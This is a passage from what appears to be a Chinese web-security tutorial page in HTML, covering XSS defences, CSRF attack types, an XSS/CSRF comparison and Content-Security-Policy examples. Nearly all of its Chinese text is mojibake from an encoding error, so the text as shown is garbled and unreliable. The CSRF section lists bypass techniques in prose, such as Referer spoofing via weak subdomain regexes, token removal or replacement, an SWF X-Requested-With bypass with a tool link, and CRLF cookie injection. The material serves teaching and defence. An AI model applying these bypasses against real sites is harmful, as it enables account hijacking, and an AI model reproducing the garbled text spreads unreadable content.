ï¼ˆhtmlencodeï¼Œjsencodeï¼‰ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›é«˜é¢‘åˆ©ç”¨å­—æ®µï¼ˆ&lt;,&gt;ï¼Œâ€,â€™ï¼‰</p></li><li><p>ç™½åå•-ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“XSSï¼Œæ”¯æŒæŒ‡å®šç™½åå•</p></li><li><p>è¾“å…¥éªŒè¯ï¼Œå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œä¸¥æ ¼çš„è½¬ä¹‰å’Œç¼–ç ï¼Œè¿‡æ»¤</p><ul><li>å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTML URLé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒURLç¼–ç </li><li>å¯¹åŠ¨æ€ç”Ÿæˆçš„JavaScriptä»£ç ï¼Œè¿™åŒ…æ‹¬è„šæœ¬éƒ¨åˆ†ä»¥åŠHTMLæ ‡ç­¾çš„äº‹ä»¶å¤„ç†å±æ€§ï¼ˆEvent Handlerï¼Œå¦‚onmouseover, onloadï¼‰ç­‰è¿›è¡ŒJavascriptç¼–ç ã€‚</li><li>å¾€ HTML æ ‡ç­¾ä¹‹é—´æ’å…¥ä¸å¯ä¿¡æ•°æ®çš„æ—¶å€™ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡Œ HTML Entity ç¼–ç  HTML å­—ç¬¦å®ä½“</li></ul></li><li><p>æœåŠ¡ç«¯çš„è¾“å‡ºæ£€æŸ¥ï¼Œä½¿ç”¨ç¼–ç æˆ–è½¬ä¹‰çš„æ–¹å¼æ¥é˜²å¾¡ XSS æ”»å‡»ã€‚</p><ul><li>ä¾‹å¦‚åˆ©ç”¨sanitize-htmlå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œæœ‰è§„åˆ™çš„è¿‡æ»¤ä¹‹åå†è¾“å‡ºåˆ°é¡µé¢ä¸­ã€‚</li></ul></li><li><p>è¾“å…¥é•¿åº¦é™åˆ¶</p></li></ul><hr><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼š<code>å·²ç™»å½•ç”¨æˆ·</code> è®¿é—® <code>æ”»å‡»è€…ç½‘ç«™</code>ï¼Œæ”»å‡»ç½‘ç«™å‘è¢«æ”»å‡»ç½‘ç«™å‘èµ·æ¶æ„è¯·æ±‚ï¼ˆåˆ©ç”¨æµè§ˆå™¨ä¼šè‡ªåŠ¨æºå¸¦cookieï¼‰ã€‚</p><p>ç”¨æˆ·åœ¨ä¸€ä¸ªæ²¡æœ‰ä¿æŠ¤çš„ç½‘ç«™ä¸‹å¤„äºç™»å½•çŠ¶æ€ï¼Œå¹¶åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ç”¨åŒä¸€ä¸ªæµè§ˆå™¨è®¿é—®äº†æ”»å‡»è€…å‘æ¥å« æœ‰æ¶æ„ä»£ç çš„ç½‘å€ï¼Œå¯¼è‡´æ”»å‡»è€…ä½¿ç”¨äº†ç”¨æˆ·çš„èº«ä»½ï¼ˆcookieï¼‰åœ¨ç½‘ç«™ä¸­æ‰§è¡Œæ¶æ„æ“ä½œ</p><p>åˆ†ç±»ä¸»è¦æ˜¯ï¼šGETå‹ã€POSTå‹</p><blockquote><p>GETå‹</p></blockquote><p>æ”»å‡»è€…ç›´æ¥è¯±å¯¼å—å®³è€…æ¶æ„çš„URLé“¾æ¥ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰å¯¹è¯¥è¯·æ±‚åšåˆ¤æ–­çš„è¯ï¼Œå°±ä¼šè‡ªåŠ¨å‘èµ·GETè¯·æ±‚ä»è€Œåˆ©ç”¨å—å®³è€…èº«ä»½è¿›è¡Œä¸€ç³»åˆ—æ“ä½œã€‚</p><blockquote><p>POSTå‹</p></blockquote><p>æ”»å‡»è€…éœ€è¦åœ¨ä»–çš„ç«™ç‚¹ä¸Šä¼ªé€  POST è¯·æ±‚ï¼Œå½“ç”¨æˆ·æ‰“å¼€è¯¥ç«™ç‚¹æ—¶ï¼Œè‡ªåŠ¨æäº¤ POST è¯·æ±‚ã€‚</p><h4 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><ul><li>Refereræºç»•è¿‡<ul><li>ç½®ç©ºï¼šåˆ é™¤refererå†…å®¹</li><li>å­åŸŸåï¼šå› ä¸ºå¼€å‘çš„æ­£åˆ™é—®é¢˜å¯èƒ½å­˜åœ¨å­åŸŸåè¿™ç§ç»•è¿‡æ–¹å¼ï¼Œæ¯”å¦‚ httpx:&#x2F;&#x2F;baidu.weiyigeek.com æˆ‘ä»¬è®©baiduå˜æˆå­åŸŸåè¿™æ ·å°±ç»•è¿‡äº†æ¯”è¾ƒå¼±çš„æ­£åˆ™äº†</li><li>ä¿®æ”¹åŸŸåï¼šå¦‚æœåŸæ¥çš„çš„ httpx:&#x2F;&#x2F;dafsec.weiyigeek.org ï¼Œé‚£ä¹ˆå¯ä»¥æ”¹æˆ</li><li>httpx:&#x2F;&#x2F;adafsec.weiyigeek.org</li><li>åˆ é™¤ X-CSRFToken æŠ¥å¤´ç„¶åå°†POSTè¯·æ±‚æ”¹ä¸ºGET</li></ul></li><li>Token Bypass<ul><li>åˆ é™¤Tokenå‚æ•°å­—æ®µ  </li><li>æ›¿æ¢ç›¸åŒé•¿åº¦çš„å€¼</li><li>è§£ç CSRFä»¤ç‰Œ</li><li>ä»…ä½¿ç”¨ä»¤ç‰Œçš„é™æ€éƒ¨åˆ†</li><li>é…åˆXSSç­‰htmlæ³¨å…¥æ‰‹æ³•è·å–tokenï¼Œéšæœºå‘åŠ¨CSRFæ”»å‡»</li></ul></li><li>X-Request-with Bypass<ul><li>åˆ©ç”¨swfè¿›è¡Œç»•è¿‡</li><li>å‰ææ¡ä»¶ï¼š<ul><li>å¯åˆ©ç”¨swfæœªæ ¡éªŒrefererå’Œorigin çš„bypass å«json xmlæ ¼å¼çš„æ•°æ®ï¼Œ </li><li>å¯ä½¿ç”¨swfæ·»åŠ X-Request-With</li></ul></li><li>å·¥å…·ï¼š httpx:&#x2F;&#x2F;github.com&#x2F;Qclover&#x2F;CSRF</li></ul></li><li>æ—è·¯cookieæ³¨å…¥ç»•è¿‡ <ul><li>æè¿°ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡cookieæ³¨å…¥ç»•è¿‡åŒé‡æäº¤cookieä¿æŠ¤<ul><li>cookieæ³¨å…¥çš„æ–¹æ³•: CRLF-injection (HTMLå“åº”æ‹†åˆ†æ³¨å…¥æ¼æ´) </li><li>Browser bugs (like CVE-2016-9078 in Firefox)</li></ul></li></ul></li></ul><h4 id="é˜²æŠ¤-1"><a href="#é˜²æŠ¤-1" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h4><blockquote><p>åŸç†</p></blockquote><p>CSRFæ”»å‡»é˜²å¾¡çš„é‡ç‚¹æ˜¯åˆ©ç”¨cookieçš„å€¼åªèƒ½è¢«ç¬¬ä¸€æ–¹è¯»å–ï¼Œæ— æ³•è¯»å–ç¬¬ä¸‰æ–¹çš„cookieå€¼ï¼š</p><p>ä¸€ä¸ªç®€å•å¯è¡Œçš„æ–¹æ³•å°±æ˜¯åœ¨å®¢æˆ·ç«¯ç½‘é¡µä¸Šå†æ¬¡æ·»åŠ ä¸€ä¸ªcookieï¼Œä¿å­˜ä¸€ä¸ªéšæœºæ•°ï¼Œè€Œç”¨æˆ·è®¿é—®çš„æ—¶å€™ï¼Œå…ˆè¯»å–è¿™ä¸ªcookieçš„å€¼ï¼Œhashä¸€ä¸‹è¿™ä¸ªcookieå€¼å¹¶å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°ç”¨æˆ·çš„hashä¹‹åçš„å€¼ï¼ŒåŒæ—¶å–å‡ºä¹‹å‰è®¾ç½®åœ¨ç”¨æˆ·ç«¯çš„cookieçš„å€¼ï¼Œç”¨åŒæ ·çš„ç®—æ³•hashè¿™ä¸ªcookieå€¼ï¼Œæ¯”è¾ƒè¿™ä¸¤ä¸ªhashå€¼ï¼Œç›¸åŒåˆ™æ˜¯åˆæ³•ã€‚ï¼ˆå¦‚æœç”¨æˆ·è®¿é—®äº†ç—…æ¯’ç½‘ç«™ï¼Œä¹Ÿæƒ³å¸¦è¿™ä¸ªcookieå»è®¿é—®çš„æ—¶å€™ï¼Œæ­¤æ—¶ï¼Œå› ä¸ºç—…æ¯’ç½‘ç«™æ— æ³•è·å–ç¬¬ä¸‰æ–¹cookieçš„å€¼ï¼Œæ‰€ä»¥ä»–ä¹Ÿå°±æ— æ³•hashè¿™ä¸ªéšæœºæ•°ï¼Œæ‰€ä»¥ä¹Ÿå°±ä¼šè¢«æœåŠ¡å™¨æ ¡éªŒçš„è¿‡æ»¤æ‰ï¼‰</p><blockquote><p>å…·ä½“é˜²å¾¡æ–¹æ³•</p></blockquote><ul><li><p>éªŒè¯ HTTP Referer å­—æ®µï¼›</p></li><li><p>åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ å®Œå¤‡çš„ token å¹¶éªŒè¯ï¼›</p></li><li><p>åœ¨ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯</p><ul><li><p>è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯ä½¿ç”¨ token å¹¶è¿›è¡ŒéªŒè¯ï¼Œå’Œä¸Šä¸€ç§æ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œå¹¶ä¸æ˜¯æŠŠ token ä»¥å‚æ•°çš„ å½¢å¼ç½®äº HTTP è¯·æ±‚ä¹‹ä¸­ï¼Œè€Œæ˜¯æŠŠå®ƒæ”¾åˆ° HTTP å¤´ä¸­è‡ªå®šä¹‰çš„å±æ€§é‡Œã€‚é€šè¿‡ XMLHttpRequest </p><p>è¿™ä¸ªç±»ï¼Œå¯ä»¥ä¸€æ¬¡æ€§ç»™æ‰€æœ‰è¯¥ç±»è¯·æ±‚åŠ ä¸Š csrftoken è¿™ä¸ª HTTP å¤´å±æ€§ï¼Œå¹¶æŠŠ token å€¼æ”¾å…¥ å…¶ä¸­ã€‚è¿™æ ·è§£å†³äº†ä¸Šç§æ–¹æ³•åœ¨è¯·æ±‚ä¸­åŠ å…¥ token çš„ä¸ä¾¿ï¼ŒåŒæ—¶ï¼Œé€šè¿‡ XMLHttpRequest è¯·æ±‚ çš„åœ°å€ä¸ä¼šè¢«è®°å½•åˆ°æµè§ˆå™¨çš„åœ°å€æ ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒ token ä¼šé€è¿‡ Referer æ³„éœ²åˆ°å…¶ä»–ç½‘ç«™ä¸­ å»ã€‚</p></li></ul></li><li><p>Chrome æµè§ˆå™¨ç«¯å¯ç”¨ SameSite cookieï¼Œä¹Ÿå°±æ˜¯ç¦ç”¨ç¬¬ä¸‰æ–¹cookieã€‚æˆ–è€…å¼€å‘æ—¶ä½¿ç”¨SameSiteå¹¶è®¾ç½®ä¸ºstrict</p></li><li><p>ä½¿ç”¨éªŒè¯ç ï¼ŒéªŒè¯ç ä¼šå¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸åº”ç”¨è¿›è¡Œäº¤äº’ï¼Œæ‰èƒ½å®Œæˆæœ€ç»ˆè¯·æ±‚ã€‚æ˜¯çš„ç”¨æˆ·æ— æ³•åœ¨ä¸çŸ¥è§‰çš„æƒ…å†µä¸‹è¿›è¡Œæ¶æ„æ“ä½œ</p></li></ul><h1 id="å¯¹æ¯”å­¦ä¹ "><a href="#å¯¹æ¯”å­¦ä¹ " class="headerlink" title="å¯¹æ¯”å­¦ä¹ "></a>å¯¹æ¯”å­¦ä¹ </h1><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>CSRFå’ŒXSSéƒ½æ˜¯å®¢æˆ·ç«¯æ”»å‡»ï¼Œå®ƒä»¬<strong>æ»¥ç”¨åŒæºç­–ç•¥</strong>ï¼Œåˆ©ç”¨webåº”ç”¨ç¨‹åºå’Œå—å®³ç”¨æˆ·ä¹‹é—´çš„ä¿¡ä»»å…³ç³»ã€‚ä»è€Œåˆ©ç”¨å—å®³è€…çš„èº«ä»½æˆ–Cookieä¿¡æ¯è¿›è¡Œå…¶ä»–æ“ä½œã€‚</p><p>ä½†æ˜¯ï¼ŒXSS å’Œ CSRF æ”»å‡»ä¹‹é—´å­˜åœ¨ä¸€äº›åŸç†ä¸Šçš„å·®å¼‚ï¼š</p><p>XSSäº§ç”ŸåŸå› ç±»ä¼¼äºSQLæ³¨å…¥ï¼Œæºäºç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«å½“æˆäº†ä»£ç æ‰§è¡Œï¼Œè€ŒCSRFäº§ç”ŸåŸå› æ›´åƒæ˜¯æµè§ˆå™¨ä¸ºäº†å¢åŠ ç”¨æˆ·çš„ä½¿ç”¨ä½“éªŒå¼±åŒ–ä¸€äº›è·¨åŸŸå’Œç¬¬ä¸‰æ–¹Cookieç™»å½•çš„éªŒè¯ã€‚</p><p>æ‰€ä»¥æœ¬è´¨ä¸Šè®²ï¼ŒXSS æ˜¯<strong>ä»£ç æ³¨å…¥</strong>é—®é¢˜ï¼Œå±äºâ€™æ”»å‡»â€™ï¼ŒCSRF æ˜¯ <strong>HTTP</strong> é—®é¢˜ï¼Œå±äºâ€™ä¼ªé€ â€™</p><p>XSS æ˜¯å†…å®¹æ²¡æœ‰è¿‡æ»¤å¯¼è‡´æµè§ˆå™¨å°†æ”»å‡»è€…çš„è¾“å…¥å½“ä»£ç æ‰§è¡Œï¼Œç®—æ˜¯ä¸€ä¸ªæ¼æ´å±‚é¢é—®é¢˜ã€‚CSRF åˆ™æ˜¯å› ä¸ºæµè§ˆå™¨åœ¨å‘é€ HTTP è¯·æ±‚æ—¶å€™è‡ªåŠ¨å¸¦ä¸Š cookieï¼Œè€Œä¸€èˆ¬ç½‘ç«™çš„ session éƒ½å­˜åœ¨ cookie é‡Œé¢ï¼Œç®—æ˜¯ä¸€ä¸ªå…³äºhttpå’Œæµè§ˆå™¨è®¾è®¡æœºåˆ¶å±‚é¢çš„é—®é¢˜ã€‚</p><p>å…¶æ¬¡ï¼ŒXSS åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼Œæ¶æ„ä»£ç å­˜å‚¨åœ¨ç«™ç‚¹ä¸­ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ï¼Œæ¶æ„ä»£ç å­˜å‚¨åœ¨å—å®³ç”¨æˆ·è®¿é—®çš„ç¬¬ä¸‰æ–¹ç«™ç‚¹ä¸­ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>XSSé€šè¿‡è¯±å¯¼å—å®³è€…ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è¯±å¯¼æœåŠ¡å™¨æ¶æ„æ¸²æŸ“æ¶æ„ä»£ç æ¥çªƒå–ç™»å½•ä¿¡æ¯ã€cookiã€æ‰§è¡ŒæœåŠ¡ç«¯å‘½ä»¤ç­‰ã€‚è€ŒCSRFåˆ™æ˜¯é€šè¿‡å—å®³è€…ç‚¹å‡»æ¶æ„é“¾æ¥ï¼Œé‡ç‚¹æ˜¯åˆ©ç”¨å…¶èº«ä»½å‘èµ·ä¸€ç³»åˆ—HTTPè¯·æ±‚ã€‚äºŒè€…éƒ½èƒ½åˆ°åˆ°å•Šä¸€ç§ç±»ä¼¼äºè¶Šæƒçš„æ•ˆæœã€‚</li><li>CSRFæ”»å‡»çš„èŒƒå›´æœ‰é™ï¼Œä»…é™äºç”¨æˆ·å¯ä»¥æ‰§è¡Œçš„æ“ä½œï¼Œä¾‹å¦‚ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è®¿é—®æ¶æ„ç½‘ç«™ã€‚ç›¸åï¼ŒXSSæ”»å‡»æä¾›æ‰§è¡Œæ¶æ„è„šæœ¬æ¥æ‰§è¡Œæ”»å‡»è€…æ‰€é€‰æ‹©çš„ä»»ä½•æ´»åŠ¨ï¼Œæ‰©å¤§äº†æ”»å‡»çš„èŒƒå›´ã€‚</li><li>XSSæ”»å‡»éµå¾ªåŒå‘æ”»å‡»æ¨¡å¼ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œæ¶æ„è„šæœ¬ã€è®¿é—®å“åº”ï¼Œå¹¶å°†åç»­æ•æ„Ÿæ•°æ®å‘é€åˆ°æ”»å‡»è€…é€‰æ‹©çš„ç›®çš„åœ°ã€‚è€ŒCSRFæ˜¯ä¸€ç§å•å‘æ”»å‡»æœºåˆ¶ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…åªèƒ½å‘èµ·HTTPè¯·æ±‚ï¼Œä½†ä¸èƒ½æ£€ç´¢å·²å‘èµ·è¯·æ±‚çš„å“åº”ã€‚</li></ul><h4 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><p>XSSä¸»è¦æ˜¯é€šè¿‡ç»•è¿‡ç½‘ç«™å¯¹è¾“å…¥çš„ç¼–ç ï¼Œé»‘åå•ç­‰é™åˆ¶ï¼Œä»è€ŒæˆåŠŸçš„æŠŠä»£ç æ³¨å…¥è¿›å®¢æˆ·ç«¯æˆ–è€…å­˜å‚¨è¿›æœåŠ¡å™¨ä¸­ã€‚è€ŒCSRFè¦è€ƒè™‘çš„é¦–è¦é—®é¢˜æ˜¯è§£å†³æµè§ˆå™¨ç¬¬ä¸‰æ–¹cookieè®¿é—®çš„é—®é¢˜ï¼Œé€šè¿‡ReferæºBypassï¼ŒToken Bypassï¼ŒX-Request-with Bypassç­‰ç»•è¿‡æµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„æ£€æŸ¥ä»è€Œå®ç°è·¨ç«™çš„è¯·æ±‚ä¼ªé€ ã€‚</p><h4 id="é˜²æŠ¤-2"><a href="#é˜²æŠ¤-2" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h4><p>XSSé˜²æŠ¤ä¸»è¦æ˜¯é™ä½ç”¨æˆ·ç«¯å¯¹æœåŠ¡ç«¯ä¹‹é—´çš„åŒå‘ä¿¡ä»»ï¼ŒåŠ å¼ºå¯¹ç”¨æˆ·è¾“å…¥å’ŒæœåŠ¡ç«¯è¾“å‡ºçš„æ ¡éªŒã€‚ä¸»è¦æ‰‹æ®µæ˜¯åŠ å¼ºå„ç§ç¼–ç å’Œè½¬ä¹‰ï¼Œæ·»åŠ é»‘ç™½åå•ï¼Œä½¿ç”¨Http onlyç­‰ã€‚</p><p>è€ŒCSRFé˜²æŠ¤ä¸»è¦æ˜¯è§£å†³æµè§ˆå™¨ç¬¬ä¸‰æ–¹cookieè®¿é—®é™åˆ¶çš„é—®é¢˜ï¼Œå…·ä½“æ–¹æ³•æ˜¯æ·»åŠ HTTP Referer å­—æ®µéªŒè¯ï¼Œ æ·»åŠ HTTP å¤´ä¸­è‡ªå®šä¹‰å±æ€§é˜²æŠ¤ï¼Œä½¿ç”¨å®Œå¤‡çš„ tokenï¼Œå¯ç”¨ SameSite cookiï¼Œä½¿ç”¨éªŒè¯ç ç­‰ã€‚</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><strong>å†…å®¹å®‰å…¨ç­–ç•¥ CSP</strong>ï¼ˆContent-Security-Policyï¼‰æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œç”¨äºæ£€æµ‹å¹¶å‰Šå¼±æŸäº›ç‰¹å®šç±»å‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰å’Œæ•°æ®æ³¨å…¥æ”»å‡»ç­‰ã€‚</p><p>CSP è¢«è®¾è®¡æˆå®Œå…¨å‘åå…¼å®¹ï¼ˆé™¤ CSP2 åœ¨å‘åå…¼å®¹æœ‰æ˜ç¡®æåŠçš„ä¸ä¸€è‡´; ï¼‰ã€‚ä¸æ”¯æŒ CSP çš„æµè§ˆå™¨ä¹Ÿèƒ½ä¸å®ç°äº† CSP çš„æœåŠ¡å™¨æ­£å¸¸å·¥ä½œï¼Œåä¹‹äº¦ç„¶ï¼šä¸æ”¯æŒ CSP çš„æµè§ˆå™¨åªä¼šå¿½ç•¥å®ƒï¼Œå¦‚å¸¸è¿è¡Œï¼Œé»˜è®¤ä¸ºç½‘é¡µå†…å®¹ä½¿ç”¨æ ‡å‡†çš„åŒæºç­–ç•¥ã€‚å¦‚æœç½‘ç«™ä¸æä¾› CSP æ ‡å¤´ï¼Œæµè§ˆå™¨ä¹Ÿä½¿ç”¨æ ‡å‡†çš„åŒæºç­–ç•¥ã€‚</p><h3 id="å¨èƒ"><a href="#å¨èƒ" class="headerlink" title="å¨èƒ"></a>å¨èƒ</h3><h4 id="é˜²æ­¢XSSæ”»å‡»"><a href="#é˜²æ­¢XSSæ”»å‡»" class="headerlink" title="é˜²æ­¢XSSæ”»å‡»"></a>é˜²æ­¢XSSæ”»å‡»</h4><p>XSS æ”»å‡»åˆ©ç”¨äº†æµè§ˆå™¨å¯¹äºä»æœåŠ¡å™¨æ‰€è·å–çš„å†…å®¹çš„ä¿¡ä»»ã€‚æ¶æ„è„šæœ¬åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­å¾—ä»¥è¿è¡Œã€‚</p><p>CSP é€šè¿‡æŒ‡å®šæœ‰æ•ˆåŸŸâ€”â€”å³æµè§ˆå™¨è®¤å¯çš„å¯æ‰§è¡Œè„šæœ¬çš„æœ‰æ•ˆæ¥æºâ€”â€”ä½¿æœåŠ¡å™¨ç®¡ç†è€…æœ‰èƒ½åŠ›å‡å°‘æˆ–æ¶ˆé™¤ XSS æ”»å‡»æ‰€ä¾èµ–çš„è½½ä½“ã€‚ä¸€ä¸ª CSP å…¼å®¹çš„æµè§ˆå™¨å°†ä¼šä»…æ‰§è¡Œä»ç™½åå•åŸŸè·å–åˆ°çš„è„šæœ¬æ–‡ä»¶ï¼Œå¿½ç•¥æ‰€æœ‰çš„å…¶ä»–è„šæœ¬ï¼ˆåŒ…æ‹¬å†…è”è„šæœ¬å’Œ HTML çš„äº‹ä»¶å¤„ç†å±æ€§ï¼‰ã€‚</p><p>ä½œä¸ºä¸€ç§ç»ˆæé˜²æŠ¤å½¢å¼ï¼Œå§‹ç»ˆä¸å…è®¸æ‰§è¡Œè„šæœ¬çš„ç«™ç‚¹å¯ä»¥é€‰æ‹©å…¨é¢ç¦æ­¢è„šæœ¬æ‰§è¡Œã€‚</p><p><strong><code>CSP</code> çš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦</strong>ï¼Œå¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œï¼Œç­‰åŒäºæä¾›ç™½åå•ã€‚ä¸¥æ ¼è§„å®šé¡µé¢ä¸­å“ªäº›èµ„æºå…è®¸æœ‰å“ªäº›èµ„æºï¼Œä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ç»Ÿç»Ÿæ‹’ç»ã€‚å®ƒçš„å®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆï¼Œå¼€å‘è€…åªéœ€æä¾›é…ç½®ã€‚å› æ­¤CSPå¤§å¤§å¢å¼ºçš„ç½‘é¡µçš„å®‰å…¨æ€§ï¼Œæ”»å‡»è€…å³ä½¿å‘ç°äº†æ¼æ´ä¹Ÿæ²¡åŠæ³•æ³¨å…¥è„šæœ¬ï¼Œé™¤éèƒ½æƒ³åŠæ³•ç»•è¿‡ç™½åå•é™åˆ¶ã€‚</p><h4 id="ç¼“è§£æ•°æ®åŒ…å—…æ¢æ”»å‡»"><a href="#ç¼“è§£æ•°æ®åŒ…å—…æ¢æ”»å‡»" class="headerlink" title="ç¼“è§£æ•°æ®åŒ…å—…æ¢æ”»å‡»"></a>ç¼“è§£æ•°æ®åŒ…å—…æ¢æ”»å‡»</h4><p>é™¤é™åˆ¶å¯ä»¥åŠ è½½å†…å®¹çš„åŸŸï¼ŒæœåŠ¡å™¨è¿˜å¯æŒ‡æ˜å“ªç§åè®®å…è®¸ä½¿ç”¨ï¼›æ¯”å¦‚ï¼ˆä»ç†æƒ³åŒ–çš„å®‰å…¨è§’åº¦æ¥è¯´ï¼‰ï¼ŒæœåŠ¡å™¨å¯æŒ‡å®šæ‰€æœ‰å†…å®¹å¿…é¡»é€šè¿‡ HTTPS åŠ è½½ã€‚ä¸€ä¸ªå®Œæ•´çš„æ•°æ®å®‰å…¨ä¼ è¾“ç­–ç•¥ä¸ä»…å¼ºåˆ¶ä½¿ç”¨ HTTPS è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œä¹Ÿä¸ºæ‰€æœ‰çš„ cookie æ ‡è®° <code>secure</code> æ ‡è¯†ï¼Œå¹¶ä¸”æä¾›è‡ªåŠ¨çš„é‡å®šå‘ä½¿å¾— HTTP é¡µé¢å¯¼å‘ HTTPS ç‰ˆæœ¬ã€‚ç½‘ç«™ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>Strict-Transport-Security</code> HTTP æ ‡å¤´ç¡®ä¿è¿æ¥å®ƒçš„æµè§ˆå™¨åªä½¿ç”¨åŠ å¯†é€šé“ã€‚</p><h3 id="ä½¿ç”¨CSP"><a href="#ä½¿ç”¨CSP" class="headerlink" title="ä½¿ç”¨CSP"></a>ä½¿ç”¨CSP</h3><p>ç¬¬ä¸€ç§æ˜¯é…ç½®å†…å®¹å®‰å…¨ç­–ç•¥æ¶‰åŠåˆ°æ·»åŠ  <code>Content-Security-Policy</code> HTTP æ ‡å¤´åˆ°ä¸€ä¸ªé¡µé¢ï¼Œå¹¶é…ç½®ç›¸åº”çš„å€¼ï¼Œä»¥æ§åˆ¶ç”¨æˆ·ä»£ç†ï¼ˆæµè§ˆå™¨ç­‰ï¼‰å¯ä»¥ä¸ºè¯¥é¡µé¢è·å–å“ªäº›èµ„æºã€‚ç¬¬äºŒç§æ˜¯é€šè¿‡ç½‘é¡µçš„metaæ ‡ç­¾ã€‚</p><p>CSPå¯ä»¥ç”±ä¸¤ç§æ–¹å¼æŒ‡å®šï¼š HTTP Header å’Œ HTMLã€‚</p><ul><li><p>é€šè¿‡å®šä¹‰åœ¨HTTP header ä¸­ä½¿ç”¨ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>ç­–ç•¥é›†</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡å®šä¹‰åœ¨ HTML metaæ ‡ç­¾ä¸­ä½¿ç”¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-security-policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ç­–ç•¥é›†&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="Content-Security-Policyæ–¹å¼ä¸¾ä¾‹"><a href="#Content-Security-Policyæ–¹å¼ä¸¾ä¾‹" class="headerlink" title="Content-Security-Policyæ–¹å¼ä¸¾ä¾‹"></a>Content-Security-Policyæ–¹å¼ä¸¾ä¾‹</h4><ul><li><p>ä¸€ä¸ªç½‘ç«™ç®¡ç†è€…æƒ³è¦æ‰€æœ‰å†…å®¹å‡æ¥è‡ªç«™ç‚¹çš„åŒä¸€ä¸ªæºï¼ˆä¸åŒ…æ‹¬å…¶å­åŸŸåï¼‰ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li><li><p>ä¸€ä¸ªç½‘ç«™ç®¡ç†è€…å…è®¸å†…å®¹æ¥è‡ªä¿¡ä»»çš„åŸŸååŠå…¶å­åŸŸåï¼ˆåŸŸåä¸å¿…é¡»ä¸ CSP è®¾ç½®æ‰€åœ¨çš„åŸŸåç›¸åŒï¼‰ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27; 